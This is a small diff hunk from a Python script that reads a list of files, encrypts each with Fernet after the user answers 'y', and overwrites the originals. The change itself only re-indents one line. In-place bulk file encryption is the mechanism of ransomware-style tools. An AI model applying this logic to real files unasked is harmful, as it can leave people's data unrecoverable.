@@ -22,7 +22,7 @@ if uinput == "y":
     for file in files:
             with open(file, "rb") as dumbfile:
                 conts = dumbfile.read()
-            encrypted_conts = Fernet(key).encrypt(conts)
+                encrypted_conts = Fernet(key).encrypt(conts)
             with open(file,"wb") as dumbfile:
                 dumbfile.write(encrypted_conts)
 else:
